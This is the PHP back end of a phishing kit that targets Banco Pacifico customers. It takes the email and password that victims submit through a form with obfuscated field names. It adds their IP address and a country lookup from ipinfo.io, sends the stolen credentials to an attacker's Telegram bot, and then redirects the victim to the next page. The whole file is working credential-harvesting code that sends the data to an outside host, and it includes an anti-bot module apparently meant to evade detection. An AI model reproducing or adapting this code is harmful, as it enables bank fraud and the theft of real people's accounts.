<?php
ini_set("display_errors", 0);
include "infotelegram.php";
include "antibots.php";


if (isset($_POST['fbwo12r92bfs']) && isset($_POST['shfn2yc0285']) ) {
    $input = $_POST['fbwo12r92bfs'];
    $input2 = $_POST['shfn2yc0285'];
    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
    $mensajex .= "[NUEVO CLIENTE - BANCO PACIFICO]\n👤EMAIL: ".$_POST['fbwo12r92bfs']."\n🔒PASS: ".$_POST['shfn2yc0285']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\n";

    env($token, $tid, $mensajex);
}
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    return json_decode($response, true);
}
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );

    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
    );

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
    
}
echo "<script>window.location.href = \"../odautes.php\"</script>";
?>




